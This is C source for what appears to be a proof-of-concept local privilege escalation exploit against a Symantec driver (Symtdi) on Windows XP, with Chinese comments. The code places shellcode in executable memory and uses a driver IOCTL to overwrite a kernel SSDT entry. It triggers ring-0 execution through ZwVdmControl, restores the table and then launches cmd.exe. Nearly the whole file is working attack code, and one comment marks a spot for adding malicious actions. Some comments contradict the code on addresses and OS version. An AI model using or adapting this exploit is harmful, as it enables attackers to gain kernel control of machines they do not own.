#include <stdio.h>
#include <windows.h>

#pragma comment (lib, "ntdll.lib")

typedef LONG NTSTATUS;

#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L) 
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L) 

typedef struct _IMAGE_FIXUP_ENTRY {
    WORD    offset:12;
    WORD    type:4;
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

extern "C"
NTSTATUS 
NTAPI
NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PULONG AllocationSize,
    IN ULONG AllocationType,
    IN ULONG Protect
    );

int main(int argc, char* argv[])
{
    NTSTATUS    status;
    HANDLE    deviceHandle;
    DWORD    dwReturnSize = 0;
    PVOID    VdmControl = NULL;
	
	//shellcode相关变量
    PVOID    ShellCodeMemory = (PVOID)0x2E332E35;//(PVOID)0x2E352E35;//???????????2E332E35h
    DWORD    MemorySize = 0x2000;

    PROCESS_INFORMATION            pi;
    STARTUPINFOA                stStartup;

	//判断操作系统类型 winXP sp1
    OSVERSIONINFOEX    OsVersionInfo;
    RtlZeroMemory( &OsVersionInfo, sizeof(OsVersionInfo) );
    OsVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx ((OSVERSIONINFO *) &OsVersionInfo);
    if ( OsVersionInfo.dwMajorVersion != 5 ) {

        printf( "Not NT5 system\n" );
        ExitProcess( 0 );
        return 0;
    }
    if ( OsVersionInfo.dwMinorVersion != 1 ) {
    
        printf( "isn't windows 2003 system\n" );
        ExitProcess( 0 );
        return 0;
    }

	//开始漏洞触发和利用	
    printf( "Symantec Local Privilege Escalation Vulnerability Exploit (POC) \n\n" );
    printf( "Tested on: \n\twindows XP (ntoskrnl.exe version) \n\n" );
    printf( "\tCoded by shineast\n\n" );
	//为shellcode分配内存
    status = NtAllocateVirtualMemory( (HANDLE)-1, 
                                      &ShellCodeMemory,//为shellcode指定的内存分配地址0x2E352E35;
                                      0, 
                                      &MemorySize, //shellcode大小0x2000;
                                      MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN,
                                      PAGE_EXECUTE_READWRITE );//可读写，可执行
    //分配成功
	if ( status != STATUS_SUCCESS ) {    
        printf( "NtAllocateVirtualMemory failed, status: %08X\n", status );
        return 0;
    }
	//把这段内存空间先填满0x90，即nop指令
    memset( ShellCodeMemory, 0x90, MemorySize );
	//再把真实的shellcode装进这段内存空间
    __asm {
        call    CopyShellCode
        //shellcode开始//////////////////////////////////////////////////////////////
		nop	
        nop
        nop
        nop
        nop
        nop
/*
在这里可以干点坏事
*/
		//int 3
        //
        // 恢复SSDT保证系统能够正常运行
		/*我们可以去Hook一个SSDT上的函数，在我们进行调用被Hook的函数时，有机会让我们的ring0代码
		得到运行,Hook的函数我依旧选择 NtVdmControl，虽然这里覆盖了9字节的数据，但是由于NtVdmControl
		后面的一个函数也为一个不常用的api，所以我们的exploit可以保证%80以上的有效率，但是一定要在
		调用ring 0代码的时候进行一些现场恢复，不然一定会死的比较难看的。
		*/
        //
        mov edi, 0x804e4150
        mov [edi], 0x805Bab48
        mov [edi+4], 0x80659dd0
        mov [edi+8], 0x805672b1
		// ntoskrnl.exe

        ret 8
		//shellcode结束//////////////////////////////////////////////////////////////

		
CopyShellCode://被上面调用，复制shellcode
        pop    esi
        lea ecx, CopyShellCode
        sub ecx, esi

        mov edi,0x2E332E35//为shellcode指定的内存分配地址0x2E352E35;
        cld
        rep movsb//开始从esi复制shellcode到edi（0x2E352E35）
    }

	//通过设备符号连接获取设备句柄，即打开设备
    deviceHandle = CreateFile("\\\\.\\Symtdi",
                        0,
                        FILE_SHARE_READ|FILE_SHARE_WRITE,
                        NULL,
                        OPEN_EXISTING,
                        0,
                        NULL);
	//如果失败
    if ( INVALID_HANDLE_VALUE == deviceHandle ) {
        printf( "Open Symtdi device failed, code: %d\n", GetLastError() );
        return 0;
    } 
	else {    
        printf( "Open Symtdi device success\n" );
    }
	/////////////////////////////////////////////////////////////////////////////////
	//打开设备成功，通过设备驱动程序中的0x83022003 dwIoControlCode
    DeviceIoControl( deviceHandle, 
                     0x83022003, 
                     NULL,
                     0,
                     (PVOID)0x804e4150,//SSDT中NtVdmControl服务函数地址的地址
                     0xC,
                     &dwReturnSize,  
                     NULL );
	////////////////////////////////////////////////////////////////////////////////
	//关闭设备
    CloseHandle( deviceHandle );

    VdmControl = GetProcAddress( LoadLibrary("ntdll.dll"), "ZwVdmControl" );
    if ( VdmControl == NULL ) {
        printf( "VdmControl == NULL\n" );
        return 0;
    }
    printf( "call shellcode ... " );
    _asm {
        xor ecx,ecx
        push ecx  //push 0
        push ecx  //push 0
        mov eax, VdmControl
        call eax
    }
    printf( "Done.\n" );

    printf( "Create New Process\n" );
    GetStartupInfo( &stStartup );
    CreateProcess( NULL,
                    "cmd.exe",
                    NULL,
                    NULL,
                    TRUE,
                    NULL,
                    NULL,
                    NULL,
                    &stStartup,
                    &pi );
    return 0;
}